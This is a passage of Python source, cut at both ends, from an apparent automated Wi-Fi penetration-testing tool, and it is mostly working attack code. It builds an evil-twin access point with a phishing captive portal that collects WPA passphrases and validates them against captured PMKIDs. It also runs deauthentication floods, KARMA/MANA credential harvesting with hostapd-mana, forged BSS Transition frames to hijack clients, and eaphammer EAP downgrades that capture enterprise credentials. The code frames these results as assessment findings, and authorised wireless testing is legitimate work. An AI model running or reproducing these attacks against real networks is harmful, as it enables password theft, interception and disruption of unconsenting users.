    return ""


def _psk_matches_pmkid(ssid: str, psk: str, ap_mac_hex: str,
                        client_mac_hex: str, pmkid_hex: str) -> bool:
    try:
        pmk   = hashlib.pbkdf2_hmac("sha1", psk.encode(), ssid.encode(), 4096, 32)
        ap_b  = bytes.fromhex(ap_mac_hex.replace(":", "").replace("-", ""))
        cli_b = bytes.fromhex(client_mac_hex.replace(":", "").replace("-", ""))
        h     = hmac.new(pmk, b"PMK Name" + ap_b + cli_b, hashlib.sha1)
        return h.digest()[:16].hex().lower() == pmkid_hex.lower().strip()
    except Exception:
        return False


def _load_pmkid_entries(output_dir: Path) -> list:
    """Return [(pmkid_hex, ap_mac_hex, client_mac_hex, ssid)] from any .hc22000 in output_dir."""
    entries = []
    for f in output_dir.rglob("*.hc22000"):
        try:
            for line in f.read_text(encoding="utf-8", errors="replace").splitlines():
                line = line.strip()
                if not line.startswith("WPA*01*"):
                    continue
                parts = line.split("*")
                if len(parts) < 6:
                    continue
                pmkid_hex, ap_mac, cli_mac, ssid_hex = parts[2], parts[3], parts[4], parts[5]
                try:
                    ssid = bytes.fromhex(ssid_hex).decode("utf-8", errors="replace")
                except Exception:
                    ssid = ssid_hex
                entries.append((pmkid_hex, ap_mac, cli_mac, ssid))
        except Exception:
            pass
    return entries


def _collect_cracked_psks(output_dir: Path) -> dict:
    """Scan phase output directories for cracked PSKs. Returns {bssid_upper: psk}."""
    result = {}
    for f in output_dir.rglob("*.pot"):
        try:
            for line in f.read_text(encoding="utf-8", errors="replace").splitlines():
                if ":" not in line:
                    continue
                hash_part, psk = line.rsplit(":", 1)
                psk = psk.strip()
                if not (8 <= len(psk) <= 63):
                    continue
                parts = hash_part.split("*")
                if len(parts) >= 4:
                    mac = parts[3].upper()
                    bssid = ":".join(mac[i:i+2] for i in range(0, 12, 2))
                    result[bssid] = psk
        except Exception:
            pass
    for f in output_dir.rglob("wpa*.txt"):
        try:
            for line in f.read_text(encoding="utf-8", errors="replace").splitlines():
                parts = line.split()
                if len(parts) >= 2 and re.match(r"([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}", parts[0]):
                    result[parts[0].upper()] = parts[-1].strip()
        except Exception:
            pass
    return result


def _assign_ip_to_iface(iface: str, ip_cidr: str) -> bool:
    try:
        subprocess.run(["ip", "addr", "flush", "dev", iface],
                       check=False, capture_output=True)
        subprocess.run(["ip", "addr", "add", ip_cidr, "dev", iface],
                       check=True, capture_output=True)
        subprocess.run(["ip", "link", "set", iface, "up"],
                       check=True, capture_output=True)
        return True
    except Exception as exc:
        err(f"Could not assign {ip_cidr} to {iface}: {exc}")
        return False


def _select_ap_channel(ap_iface: str, preferred: int) -> int | None:
    """Return a channel allowed for AP mode on ap_iface, nearest to preferred.

    Queries iw for the regulatory-allowed channel list on the interface's phy
    and filters out channels flagged NO-IR, disabled, or passive-only.
    Handles both single-line flags (* 5180 MHz [36] (no IR)) and continuation
    lines where flags appear on the line(s) after the frequency entry.
    Falls back to a hardcoded UNII-3 preference for 5 GHz when iw parsing
    yields no usable channels.
    """
    _BAD = ('no ir', 'disabled', 'passive')

    def _is_bad(flags: str) -> bool:
        fl = flags.lower()
        return any(b in fl for b in _BAD)

    if not shutil.which("iw"):
        return preferred

    info_out, _ = _run(["iw", "dev", ap_iface, "info"], timeout=5)
    m = re.search(r'wiphy\s+(\d+)', info_out)
    if not m:
        return preferred
    phy = f"phy{m.group(1)}"

    list_out, _ = _run(["iw", "list"], timeout=10)
    allowed: set[int] = set()
    in_phy    = False
    in_freqs  = False
    cur_chan: int | None = None
    cur_flags = ""

    def _commit() -> None:
        nonlocal cur_chan, cur_flags
        if cur_chan is not None and not _is_bad(cur_flags):
            allowed.add(cur_chan)
        cur_chan  = None
        cur_flags = ""

    for line in list_out.splitlines():
        # Top-level Wiphy header — no leading whitespace
        wm = re.match(r'^Wiphy\s+(\S+)', line)
        if wm:
            _commit()
            in_phy   = (wm.group(1) == phy)
            in_freqs = False
            continue
        if not in_phy:
            continue
        if 'Frequencies:' in line:
            _commit()
            in_freqs = True
            continue
        if not in_freqs:
            continue
        # Leaving the Wiphy block entirely (unindented line)
        if line and not line[0].isspace():
            _commit()
            in_freqs = False
            continue
        fm = re.search(r'\* (\d+) MHz \[(\d+)\](.*)', line)
        if fm:
            _commit()
            cur_chan  = int(fm.group(2))
            cur_flags = fm.group(3)
        elif cur_chan is not None:
            # Continuation line with extra flags (e.g. "(no IR)" on its own line)
            cur_flags += ' ' + line

    _commit()

    if not allowed:
        # iw parsing succeeded but every channel is blocked (e.g. world
        # regdomain "00" marking all 5 GHz channels NO-IR).  Return None so
        # callers can decide whether to set a regulatory domain and retry, or
        # fall back to 2.4 GHz entirely.
        return None

    if preferred in allowed:
        return preferred

    is_5g   = preferred >= 36
    in_band = [c for c in allowed if (c >= 36) == is_5g]
    if in_band:
        return min(in_band, key=lambda c: abs(c - preferred))
    return min(allowed, key=lambda c: abs(c - preferred))


def _write_hostapd_conf(ssid: str, bssid: str, channel: int,
                         encryption: str, psk: str, ap_iface: str,
                         work_dir: Path, country_code: str = "") -> Path:
    enc_up = (encryption or "").upper()
    if psk and ("WPA" in enc_up or "WPA2" in enc_up):
        security = (
            f"wpa=2\nwpa_passphrase={psk}\n"
            f"wpa_key_mgmt=WPA-PSK\nrsn_pairwise=CCMP\n"
        )
    else:
        security = ""
    ch      = channel or 6
    hw_mode = "a" if ch >= 36 else "g"
    conf  = f"interface={ap_iface}\n"
    conf += f"driver=nl80211\n"
    conf += f"ssid={ssid}\n"
    conf += f"hw_mode={hw_mode}\n"
    conf += f"channel={ch}\n"
    conf += f"ignore_broadcast_ssid=0\n"
    if bssid:
        conf += f"bssid={bssid}\n"
    if country_code and ch >= 36:
        conf += f"country_code={country_code}\n"
        conf += "ieee80211d=1\n"
        conf += "ieee80211h=1\n"
    conf += security
    conf_path = work_dir / "hostapd.conf"
    conf_path.write_text(conf, encoding="utf-8")
    return conf_path


def _write_dnsmasq_conf(ap_iface: str, work_dir: Path) -> Path:
    conf = (
        f"interface={ap_iface}\n"
        f"bind-interfaces\n"
        f"dhcp-range={_CAPTIVE_DHCP_START},{_CAPTIVE_DHCP_END},12h\n"
        f"dhcp-option=3,{_CAPTIVE_IP}\n"
        f"dhcp-option=6,{_CAPTIVE_IP}\n"
        f"address=/#/{_CAPTIVE_IP}\n"
        f"no-resolv\n"
        f"log-dhcp\n"
    )
    conf_path = work_dir / "dnsmasq.conf"
    conf_path.write_text(conf, encoding="utf-8")
    return conf_path


def _iptables_captive_setup(ap_iface: str) -> None:
    cmds = [
        ["iptables", "-t", "nat", "-A", "PREROUTING", "-i", ap_iface,
         "-p", "tcp", "--dport", "80", "-j", "REDIRECT", "--to-port", str(_CAPTIVE_PORT)],
        ["iptables", "-t", "nat", "-A", "PREROUTING", "-i", ap_iface,
         "-p", "tcp", "--dport", "443", "-j", "REDIRECT", "--to-port", str(_CAPTIVE_PORT)],
        ["iptables", "-A", "FORWARD", "-i", ap_iface, "-j", "DROP"],
    ]
    for c in cmds:
        subprocess.run(c, check=False, capture_output=True)


def _iptables_captive_teardown(ap_iface: str) -> None:
    cmds = [
        ["iptables", "-t", "nat", "-D", "PREROUTING", "-i", ap_iface,
         "-p", "tcp", "--dport", "80", "-j", "REDIRECT", "--to-port", str(_CAPTIVE_PORT)],
        ["iptables", "-t", "nat", "-D", "PREROUTING", "-i", ap_iface,
         "-p", "tcp", "--dport", "443", "-j", "REDIRECT", "--to-port", str(_CAPTIVE_PORT)],
        ["iptables", "-D", "FORWARD", "-i", ap_iface, "-j", "DROP"],
    ]
    for c in cmds:
        subprocess.run(c, check=False, capture_output=True)


def _iptables_nat_setup(ap_iface: str, upstream_iface: str) -> None:
    subprocess.run(["sh", "-c", "echo 1 > /proc/sys/net/ipv4/ip_forward"],
                   check=False, capture_output=True)
    cmds = [
        ["iptables", "-t", "nat", "-A", "POSTROUTING", "-o", upstream_iface, "-j", "MASQUERADE"],
        ["iptables", "-A", "FORWARD", "-i", ap_iface, "-o", upstream_iface, "-j", "ACCEPT"],
        ["iptables", "-A", "FORWARD", "-i", upstream_iface, "-o", ap_iface,
         "-m", "state", "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT"],
    ]
    for c in cmds:
        subprocess.run(c, check=False, capture_output=True)


def _iptables_nat_teardown(ap_iface: str, upstream_iface: str) -> None:
    cmds = [
        ["iptables", "-t", "nat", "-D", "POSTROUTING", "-o", upstream_iface, "-j", "MASQUERADE"],
        ["iptables", "-D", "FORWARD", "-i", ap_iface, "-o", upstream_iface, "-j", "ACCEPT"],
        ["iptables", "-D", "FORWARD", "-i", upstream_iface, "-o", ap_iface,
         "-m", "state", "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT"],
    ]
    for c in cmds:
        subprocess.run(c, check=False, capture_output=True)


class _PortalHandler(BaseHTTPRequestHandler):
    ssid          = ""
    pmkid_entries = []
    result_q      = None
    captured_psks = []

    def log_message(self, fmt, *args):
        pass

    def _send_html(self, code: int, body: str) -> None:
        data = body.encode("utf-8")
        self.send_response(code)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def do_GET(self):
        if self.path not in ("/", "/portal", "/generate_204", "/hotspot-detect.html"):
            self.send_response(302)
            self.send_header("Location", f"http://{_CAPTIVE_IP}:{_CAPTIVE_PORT}/")
            self.end_headers()
            return
        html = _CAPTIVE_HTML.format(ssid=self.ssid, error="")
        self._send_html(200, html)

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body   = self.rfile.read(length).decode("utf-8", errors="replace")
        params = urllib.parse.parse_qs(body)
        psk    = (params.get("psk", [""])[0]).strip()
        if not psk:
            html = _CAPTIVE_HTML.format(ssid=self.ssid,
                                        error='<div class="err">Password cannot be empty.</div>')
            self._send_html(200, html)
            return
        _PortalHandler.captured_psks.append(psk)
        valid = False
        for pmkid_hex, ap_mac, cli_mac, cap_ssid in _PortalHandler.pmkid_entries:
            if _psk_matches_pmkid(self.ssid or cap_ssid, psk, ap_mac, cli_mac, pmkid_hex):
                valid = True
                break
        if valid and _PortalHandler.result_q is not None:
            _PortalHandler.result_q.put(("valid", psk))
        elif _PortalHandler.result_q is not None:
            _PortalHandler.result_q.put(("captured", psk))
        self._send_html(200, _CAPTIVE_SUCCESS_HTML)


def _run_portal_server(stop_evt: threading.Event) -> None:
    try:
        server = HTTPServer((_CAPTIVE_IP, _CAPTIVE_PORT), _PortalHandler)
        server.timeout = 1.0
        while not stop_evt.is_set():
            server.handle_request()
        server.server_close()
    except Exception as exc:
        err(f"Captive portal error: {exc}")


# ── Phase 6a: Rogue AP / Evil Twin ────────────────────────────────────────────

def phase_rogue_ap(monitor_iface: str, primary_iface: str, target_aps: list,
                   enriched_aps: list, output_dir: Path, rogue_cfg: dict,
                   timeout: int, cracked_psks: dict = None) -> None:
    _check_pause()
    status("p6_rogue_ap", "Phase 6: Rogue AP / Evil Twin", "running")
    log("[6a] START: Rogue AP / Evil Twin attack")
    cracked_psks = cracked_psks or {}

    ap_iface = (rogue_cfg.get("ap_interface") or "").strip()
    if not ap_iface:
        ap_iface = _find_ap_interface([monitor_iface, primary_iface])
    if not ap_iface:
        log("Phase 6: No second wireless interface found — skipping Rogue AP.")
        log("  Set rogue_ap.ap_interface in config to specify one explicitly.")
        status("p6_rogue_ap", "Phase 6: Rogue AP / Evil Twin", "skipped")
        return

    aps = target_aps or enriched_aps
    if not aps:
        log("Phase 6: No target APs — skipping.")
        status("p6_rogue_ap", "Phase 6: Rogue AP / Evil Twin", "skipped")
        return

    best = sorted(aps, key=lambda a: a.get("score", 0), reverse=True)[0]
    ssid       = best.get("ssid", "")
    bssid      = best.get("bssid", "")
    channel    = int(best.get("channel") or 6)
    encryption = (best.get("encryption") or "").upper()
    psk        = cracked_psks.get(bssid.upper(), "")

    use_portal  = rogue_cfg.get("phishing_portal", True) and not psk
    use_psk_ap  = bool(psk) and not use_portal
    deauth_cl   = rogue_cfg.get("deauth_clients", False)
    duration    = int(rogue_cfg.get("portal_duration", 180))

    country = (rogue_cfg.get("country_code") or "US").strip().upper()
    _run(["sudo", "iw", "reg", "set", country], timeout=5)
    time.sleep(1)

    ap_channel = _select_ap_channel(ap_iface, channel)
    if ap_channel is None:
        log(f"Phase 6: No allowed 5GHz channels on {ap_iface} after reg set {country!r} "
            f"— falling back to 2.4GHz (ch 6)")
        ap_channel = 6
    elif ap_channel != channel:
        log(f"Phase 6: Channel {channel} not available for AP mode on {ap_iface} "
            f"(NO-IR/disabled) — using channel {ap_channel}")

    rogue_dir = output_dir / "rogue_ap"
    rogue_dir.mkdir(exist_ok=True)
    log(f"Phase 6: Interface={ap_iface}  Target={ssid!r} [{bssid}]  "
        f"Mode={'WPA2+PSK' if use_psk_ap else 'Open+Portal' if use_portal else 'Open'}")

    # Assign IP to AP interface
    if not _assign_ip_to_iface(ap_iface, f"{_CAPTIVE_IP}/24"):
        status("p6_rogue_ap", "Phase 6: Rogue AP / Evil Twin", "error")
        return

    # Write configs
    ha_conf = _write_hostapd_conf(
        ssid, bssid, ap_channel,
        "WPA2" if use_psk_ap else "OPEN", psk if use_psk_ap else "",
        ap_iface, rogue_dir, country,
    )
    dm_conf = _write_dnsmasq_conf(ap_iface, rogue_dir)

    # Load PMKID entries for portal validation
    pmkid_entries = _load_pmkid_entries(output_dir)
    _PortalHandler.ssid = ssid
    _PortalHandler.pmkid_entries = pmkid_entries
    _PortalHandler.captured_psks = []
    portal_q   = queue.Queue()
    _PortalHandler.result_q = portal_q
    stop_portal = threading.Event()

    hostapd_proc  = None
    dnsmasq_proc  = None
    captured_psk  = None
    connected_clients = []

    try:
        # Start dnsmasq
        dnsmasq_log = rogue_dir / "dnsmasq.log"
        dnsmasq_proc = subprocess.Popen(
            ["dnsmasq", "--conf-file=" + str(dm_conf),
             "--pid-file=" + str(rogue_dir / "dnsmasq.pid"),
             "--log-facility=" + str(dnsmasq_log), "--no-daemon"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )
        time.sleep(0.5)

        # Start hostapd
        hostapd_log = rogue_dir / "hostapd.log"
        with open(hostapd_log, "w") as hlog:
            hostapd_proc = subprocess.Popen(
                ["hostapd", str(ha_conf)],
                stdout=hlog, stderr=hlog,
            )
        time.sleep(2)
        if hostapd_proc.poll() is not None:
            err("Phase 6: hostapd failed to start — check hostapd.log")
            status("p6_rogue_ap", "Phase 6: Rogue AP / Evil Twin", "error")
            return

        log(f"Phase 6: Rogue AP '{ssid}' active on {ap_iface} (channel {channel})")

        if use_portal:
            _iptables_captive_setup(ap_iface)
            portal_thread = threading.Thread(
                target=_run_portal_server, args=(stop_portal,), daemon=True
            )
            portal_thread.start()
            log("Phase 6: Captive portal active — waiting for client credentials")

        # Periodic deauth to force client reconnection to rogue AP
        deauth_t = None
        has_aireplay = shutil.which("aireplay-ng") is not None
        if deauth_cl and has_aireplay:
            def _deauth_loop():
                while not stop_portal.is_set():
                    for ap in aps:
                        for cl in (ap.get("clients") or []):
                            _run(["sudo", "aireplay-ng", "--deauth", "3",
                                  "-a", ap["bssid"], "-c", cl["mac"],
                                  monitor_iface], timeout=10)
                    _pause_sleep(15)
            deauth_t = threading.Thread(target=_deauth_loop, daemon=True)
            deauth_t.start()
        elif deauth_cl and not has_aireplay:
            log("Phase 6: deauth_clients enabled but aireplay-ng not found — skipping deauth")

        deadline = time.time() + duration
        while time.time() < deadline:
            time.sleep(2)
            # Check for captured PSK from portal
            while not portal_q.empty():
                kind, val = portal_q.get_nowait()
                log(f"Phase 6: PSK {'validated' if kind=='valid' else 'captured'}: "
                    f"{val[:4]}{'*'*(len(val)-4)}")
                captured_psk = val
                _cracked_psks[bssid.upper()] = val

            # Check clients in dnsmasq leases
            leases_file = Path("/var/lib/misc/dnsmasq.leases")
            if not leases_file.exists():
                leases_file = rogue_dir / "dnsmasq.leases"
            if leases_file.exists():
                try:
                    for line in leases_file.read_text().splitlines():
                        parts = line.split()
                        if len(parts) >= 4:
                            entry = {"mac": parts[1], "ip": parts[2], "hostname": parts[3]}
                            if entry not in connected_clients:
                                connected_clients.append(entry)
                                log(f"Phase 6: Client connected → {parts[2]} ({parts[1]})")
                except Exception:
                    pass

        stop_portal.set()

        # Report findings
        findings_data = {
            "ssid": ssid, "bssid": bssid, "channel": channel,
            "ap_interface": ap_iface,
            "clients_connected": len(connected_clients),
            "clients": connected_clients,
            "psk_captured": captured_psk or "",
            "psk_validated": bool(pmkid_entries and captured_psk),
            "portal_mode": use_portal,
        }
        (rogue_dir / "rogue_ap_results.json").write_text(
            json.dumps(findings_data, indent=2), encoding="utf-8"
        )

        if connected_clients:
            finding_from_cat(
                "rogue_ap_clients",
                data=findings_data,
                output_file=str(rogue_dir / "rogue_ap_results.json"),
                title_override=f"Clients Auto-Associated to Rogue AP: {ssid}",
            )
        if captured_psk:
            finding_from_cat(
                "psk_phished",
                data=findings_data,
                output_file=str(rogue_dir / "rogue_ap_results.json"),
                title_override=f"WPA Passphrase Captured via Phishing Portal: {ssid}",
            )
        log(f"Phase 6: Complete — {len(connected_clients)} client(s) connected"
            + (f", PSK captured" if captured_psk else ""))

    finally:
        stop_portal.set()
        if use_portal:
            _iptables_captive_teardown(ap_iface)
        for proc in (hostapd_proc, dnsmasq_proc):
            if proc and proc.poll() is None:
                _kill_proc(proc)
        subprocess.run(["ip", "addr", "flush", "dev", ap_iface],
                       check=False, capture_output=True)

    log("[6a] END: Rogue AP / Evil Twin complete")
    status("p6_rogue_ap", "Phase 6: Rogue AP / Evil Twin", "complete")


# ── Phase 6b: KARMA / MANA ────────────────────────────────────────────────────

def phase_karma(monitor_iface: str, primary_iface: str, output_dir: Path,
                rogue_cfg: dict, timeout: int) -> None:
    _check_pause()
    status("p6b_karma", "Phase 6b: KARMA / MANA Attack", "running")
    log("[6b] START: KARMA / MANA credential harvesting")

    ap_iface = (rogue_cfg.get("ap_interface") or "").strip()
    if not ap_iface:
        ap_iface = _find_ap_interface([monitor_iface, primary_iface])
    if not ap_iface:
        log("Phase 6b: No second wireless interface — skipping KARMA.")
        status("p6b_karma", "Phase 6b: KARMA / MANA Attack", "skipped")
        return

    karma_dir = output_dir / "karma"
    karma_dir.mkdir(exist_ok=True)
    duration  = int(rogue_cfg.get("portal_duration", 120))

    # Prefer hostapd-mana; fall back to bettercap
    hostapd_mana = shutil.which("hostapd-mana")
    bettercap    = shutil.which("bettercap")

    if hostapd_mana:
        conf_content = (
            "interface=" + ap_iface + "\n"
            "driver=nl80211\n"
            "ssid=FreeWiFi\n"
            "hw_mode=g\n"
            "channel=6\n"
            "mana_wpe=1\n"
            "mana_credout=" + str(karma_dir / "karma_credentials.txt") + "\n"
            "enable_mana=1\n"
            "enable_sycophant=1\n"
        )
        conf_path = karma_dir / "hostapd_mana.conf"
        conf_path.write_text(conf_content, encoding="utf-8")
        log(f"Phase 6b: Starting KARMA attack via hostapd-mana on {ap_iface}")
        if not _assign_ip_to_iface(ap_iface, f"{_CAPTIVE_IP}/24"):
            status("p6b_karma", "Phase 6b: KARMA / MANA Attack", "error")
            return
        dm_conf  = _write_dnsmasq_conf(ap_iface, karma_dir)
        dnsmasq_proc = subprocess.Popen(
            ["dnsmasq", "--conf-file=" + str(dm_conf), "--no-daemon"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )
        karma_proc = subprocess.Popen(
            [hostapd_mana, str(conf_path)],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )
        _pause_sleep(duration)
        _kill_proc(karma_proc)
        _kill_proc(dnsmasq_proc)
        subprocess.run(["ip", "addr", "flush", "dev", ap_iface],
                       check=False, capture_output=True)
        cred_file = karma_dir / "karma_credentials.txt"
        if cred_file.exists():
            creds = cred_file.read_text(encoding="utf-8", errors="replace")
            if creds.strip():
                finding_from_cat(
                    "karma_credentials",
                    data={"credentials_raw": creds[:2000]},
                    output_file=str(cred_file),
                    title_override="WPA-Enterprise Credentials Captured via KARMA/MANA Attack",
                )
                log(f"Phase 6b: Credentials captured — see {cred_file}")
            else:
                log("Phase 6b: No credentials captured.")
        else:
            log("Phase 6b: No credential output generated.")

    elif bettercap:
        log(f"Phase 6b: Starting KARMA via bettercap on {monitor_iface}")
        bc_script = karma_dir / "karma.cap"
        bc_script.write_text(
            "wifi.recon on\n"
            f"set wifi.interface {monitor_iface}\n"
            "wifi.assoc.flood on\n"
            f"set events.stream.output {karma_dir}/karma_events.txt\n",
            encoding="utf-8",
        )
        try:
            out, rc = _run(
                ["bettercap", "-iface", monitor_iface, "-caplet", str(bc_script)],
                timeout=duration,
            )
            (karma_dir / "bettercap.log").write_text(out, encoding="utf-8")
        except Exception as exc:
            err(f"Phase 6b: bettercap error: {exc}")
    else:
        log("Phase 6b: Neither hostapd-mana nor bettercap found — skipping KARMA.")
        status("p6b_karma", "Phase 6b: KARMA / MANA Attack", "skipped")
        return

    log("[6b] END: KARMA / MANA attack complete")
    status("p6b_karma", "Phase 6b: KARMA / MANA Attack", "complete")


# ── Phase 7: Client-Side / Management Frame Attacks ───────────────────────────

def _send_btm_request(monitor_iface: str, client_mac: str,
                      ap_bssid: str, channel: int) -> bool:
    try:
        from scapy.all import RadioTap, Dot11, Raw, sendp  # type: ignore
    except ImportError:
        return False
    try:
        btm_body = bytes([
            10,          # Category: WNM (Wireless Network Management)
            7,           # Action: BSS Transition Management Request
            0x01,        # Dialog Token
            0x11,        # Request Mode: Preferred Candidate List | ESS Disassociation Imminent
            0x00, 0x00,  # Disassociation Timer: 0 TBTTs (immediate)
            0xFF,        # Validity Interval: 255 TBTTs
        ])
        frame = (
            RadioTap() /
            Dot11(type=0, subtype=13,
                  addr1=client_mac, addr2=ap_bssid, addr3=ap_bssid) /
            Raw(load=btm_body)
        )
        sendp(frame, iface=monitor_iface, count=5, inter=0.1, verbose=False)
        return True
    except Exception:
        return False


def phase_client_attacks(monitor_iface: str, target_aps: list,
                          enriched_aps: list, output_dir: Path, timeout: int) -> None:
    _check_pause()
    status("p7_client", "Phase 7: Client-Side / Management Frame Attacks", "running")
    aps = target_aps or enriched_aps
    log(f"[7] START: Client-Side / Management Frame Attacks — {len(aps)} AP(s)")
    ca_dir = output_dir / "client_attacks"
    ca_dir.mkdir(exist_ok=True)
    results = {"pmf": [], "btm": [], "probes": []}

    # ── 7a: PMF enforcement ───────────────────────────────────────────────────
    status("p7_pmf", "Phase 7a: PMF Enforcement Testing", "running")
    for ap in aps:
        bssid   = ap.get("bssid", "")
        ssid    = ap.get("ssid", "")
        channel = int(ap.get("channel") or 6)
        clients = ap.get("clients") or []
        if not bssid:
            continue

        enc_field = (ap.get("encryption") or "") + " " + (ap.get("auth") or "")
        pmf_required  = bool(re.search(r"\bMFPR\b|\bSAE\b|WPA3", enc_field, re.I))
        pmf_capable   = bool(re.search(r"\bMFPC\b|\bPMF\b", enc_field, re.I)) or pmf_required

        # Attempt deauth against first observed client
        deauth_worked = None
        if clients:
            client_mac = clients[0]["mac"]
            out, rc = _run([
                "aireplay-ng", "--deauth", "10",
                "-a", bssid, "-c", client_mac, monitor_iface,
            ], timeout=20)
            deauth_worked = rc == 0 and "Sending 802.11 deauthentication" in out
        else:
            # Broadcast deauth
            out, rc = _run([
                "aireplay-ng", "--deauth", "5", "-a", bssid, monitor_iface,
            ], timeout=15)
            deauth_worked = rc == 0

        finding_text = (
            f"PMF Required: {pmf_required} | PMF Capable: {pmf_capable} | "
            f"Deauth {'accepted' if deauth_worked else 'blocked'}"
        )
        result = {
            "ssid": ssid, "bssid": bssid,
            "pmf_required": pmf_required, "pmf_capable": pmf_capable,
            "deauth_effective": deauth_worked,
        }
        results["pmf"].append(result)
        log(f"Phase 7a PMF [{bssid}]: {finding_text}")

        if not pmf_required:
            finding_from_cat(
                "pmf_not_enforced",
                data=result,
                output_file=str(ca_dir / "pmf_results.json"),
                title_override=f"PMF Not Required: Management Frames Unprotected on {ssid}",
            )

    (ca_dir / "pmf_results.json").write_text(json.dumps(results["pmf"], indent=2), encoding="utf-8")
    status("p7_pmf", "Phase 7a: PMF Enforcement Testing", "complete")

    # ── 7b: BSS Transition Management hijacking ────────────────────────────────
    status("p7_btm", "Phase 7b: BSS Transition Hijacking", "running")
    btm_results = []
    if not shutil.which("python3") or True:  # scapy check happens inside _send_btm_request
        for ap in aps:
            bssid   = ap.get("bssid", "")
            ssid    = ap.get("ssid", "")
            channel = int(ap.get("channel") or 6)
            for client in (ap.get("clients") or []):
                client_mac = client.get("mac", "")
                if not client_mac:
                    continue
                log(f"Phase 7b: Sending BTM Request to {client_mac} → {ssid!r} [{bssid}]")
                sent = _send_btm_request(monitor_iface, client_mac, bssid, channel)
                btm_results.append({
                    "ssid": ssid, "bssid": bssid,
                    "client": client_mac, "sent": sent,
                })
                if sent:
                    # Title omitted — _merge_native_findings collapses by
                    # BSSID and lists each redirected client in affected[].
                    finding_from_cat(
                        "btm_hijack",
                        data={"ssid": ssid, "bssid": bssid, "client": client_mac},
                        output_file=str(ca_dir / "btm_results.json"),
                    )
        if not btm_results:
            log("Phase 7b: No associated clients found for BTM targeting.")
    (ca_dir / "btm_results.json").write_text(json.dumps(btm_results, indent=2), encoding="utf-8")
    status("p7_btm", "Phase 7b: BSS Transition Hijacking", "complete")

    # ── 7c: Probe request harvest analysis ────────────────────────────────────
    status("p7_probes", "Phase 7c: Client Probe Harvest Analysis", "running")
    probe_data = []
    for ap in enriched_aps:
        for client in (ap.get("clients") or []):
            mac     = client.get("mac", "")
            probes  = client.get("probes") or client.get("probe_ssids") or []
            if mac and probes:
                probe_data.append({"client_mac": mac, "probed_ssids": probes,
                                    "seen_on_bssid": ap.get("bssid", "")})
                log(f"Phase 7c: {mac} probing: {', '.join(probes)}")
    if probe_data:
        (ca_dir / "probe_harvest.json").write_text(
            json.dumps(probe_data, indent=2), encoding="utf-8"
        )
        finding_from_cat(
            "probe_harvest",
            data={"count": len(probe_data), "clients": probe_data},
            output_file=str(ca_dir / "probe_harvest.json"),
            title_override=f"Client Preferred Network List Harvested: {len(probe_data)} Device(s)",
        )
    else:
        log("Phase 7c: No probe request data available from Phase 0-I.")
    status("p7_probes", "Phase 7c: Client Probe Harvest Analysis", "complete")

    results["btm"]    = btm_results
    results["probes"] = probe_data
    log(f"[7] END: Client-Side attacks — PMF={len(results['pmf'])}, BTM={len(btm_results)}, Probes={len(probe_data)}")
    status("p7_client", "Phase 7: Client-Side / Management Frame Attacks", "complete")


# ── Phase 8: EAP Downgrade ────────────────────────────────────────────────────

def phase_eap_downgrade(monitor_iface: str, target_aps: list,
                         eaphammer_path: str, output_dir: Path, timeout: int) -> None:
    _check_pause()
    status("p8_eap_downgrade", "Phase 8: EAP Downgrade Attack", "running")
    log("[8] START: EAP Downgrade — testing WPA-Enterprise APs for weak EAP methods")

    enterprise_aps = [
        ap for ap in target_aps
        if re.search(r"MGT|EAP|Enterprise|802\.1[Xx]",
                     (ap.get("auth") or "") + " " + (ap.get("encryption") or ""), re.I)
    ]
    if not enterprise_aps:
        log("Phase 8: No WPA-Enterprise APs in scope — skipping EAP downgrade.")
        status("p8_eap_downgrade", "Phase 8: EAP Downgrade Attack", "skipped")
        return
    log(f"[8] Found {len(enterprise_aps)} WPA-Enterprise AP(s)")

    ep_path = Path(eaphammer_path) if Path(eaphammer_path).exists() else Path(
        shutil.which("eaphammer") or "/opt/eaphammer/eaphammer"
    )
    if not ep_path.exists():
        log("Phase 8: eaphammer not found — skipping EAP downgrade.")
        status("p8_eap_downgrade", "Phase 8: EAP Downgrade Attack", "skipped")
        return

    dg_dir = output_dir / "eap_downgrade"
    dg_dir.mkdir(exist_ok=True)

    for ap in enterprise_aps:
        ssid    = ap.get("ssid", "")
        bssid   = ap.get("bssid", "")
        channel = int(ap.get("channel") or 6)
        log(f"Phase 8: Downgrade attack on {ssid!r} [{bssid}]")
        cred_file = dg_dir / f"creds_{bssid.replace(':','')}.txt"
        cmd = [
            str(ep_path), "--interface", monitor_iface,
            "--essid", ssid, "--channel", str(channel),
            "--auth", "wpa-eap",
            "--creds",
            "--negotiate", "balanced",  # allows downgrade to weaker EAP methods
        ]
        if bssid:
            cmd += ["--bssid", bssid]
        try:
            out, rc = _run(cmd, timeout=min(timeout, 120))
            (dg_dir / f"eaphammer_{bssid.replace(':','')}.log").write_text(
                out, encoding="utf-8"
            )
            cred_lines = [l for l in out.splitlines()
                          if re.search(r"username|password|mschapv2|credential", l, re.I)]
            if cred_lines:
                cred_file.write_text("\n".join(cred_lines), encoding="utf-8")
                finding_from_cat(
                    "eap_downgrade_creds",
                    data={"ssid": ssid, "bssid": bssid,
                          "credentials_raw": "\n".join(cred_lines[:20])},
                    output_file=str(cred_file),
                    title_override=f"EAP Downgrade: Credentials Captured from {ssid}",
                )
                log(f"Phase 8: Credentials captured for {ssid!r}")
            else:
                log(f"Phase 8: No credentials captured for {ssid!r}")
        except Exception as exc:
            err(f"Phase 8: eaphammer error for {ssid!r}: {exc}")

    log(f"[8] END: EAP Downgrade — tested {len(enterprise_aps)} AP(s)")
    status("p8_eap_downgrade", "Phase 8: EAP Downgrade Attack", "complete")


# ── Phase 8b: EAP-FAST Anonymous PAC Provisioning ─────────────────────────────
# 2026-06-11 review round 5: explicit EAP-FAST attack that exploits
# anonymous in-band PAC provisioning (RFC 4851 §3.4) which still ships
# enabled on many corporate WPA-Enterprise SSIDs.  In anonymous mode,
# the supplicant accepts a PAC from any AP without server-cert
# validation, allowing MITM credential capture.  We run eaphammer in
# EAP-FAST-only mode with --auto-pac which provisions a fresh PAC to
# every connecting station then captures the inner MSCHAPv2 exchange.

def phase_eap_fast_anon(monitor_iface: str, target_aps: list,
